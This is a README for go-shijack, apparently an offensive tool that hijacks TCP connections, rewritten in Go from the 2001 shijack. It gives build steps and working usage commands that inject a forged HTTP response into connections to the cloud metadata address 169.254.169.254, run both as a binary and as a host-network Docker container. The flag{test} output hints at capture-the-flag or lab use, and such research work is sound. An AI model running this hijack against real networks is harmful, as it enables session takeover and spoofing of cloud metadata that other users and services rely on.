# go-shijack

tcp connection hijacker, go rewrite of shijack from 2001.

## build

```
make go-shijack
```

```
make container
```

```
CGO_ENABLED=0 go install github.com/ssst0n3/go-shijack/cmd/go-shijack@v0.1.0
```

## usage

### 1. write response file

```
root@ecs-c5a4:~# cat > flag << EOF

HTTP/1.1 200 OK
Content-Length: 11

flag{test}
EOF
```

### 2. hijack

#### 2.1 method1: binary

```
root@ecs-c5a4:~# ./go-shijack -t eth0 -i 169.254.169.254 -p 80 -f flag &
[1] 362712
root@ecs-c5a4:~# curl http://169.254.169.254
flag{test}
```

#### 2.2 method2: container

```
root@ecs-c5a4:~# docker run -d --net=host -ti --rm -v $(pwd):/data ssst0n3/go-shijack:v0.1 -t eth0 -i 169.254.169.254 -p 80 -f /data/flag -k
root@ecs-c5a4:~# curl http://169.254.169.254
flag{test}
```

## bpf

### method 1

Use predefined pattern, just provide host and port to go-shijack

### TODO: method 2 

Compile filter manually

`tcpdump ip -d -s 65536 host 169.254.169.254`

## related project

* [rshijack](https://github.com/kpcyrd/rshijack)
* [shijack](https://packetstormsecurity.com/files/24657/shijack.tgz.html)
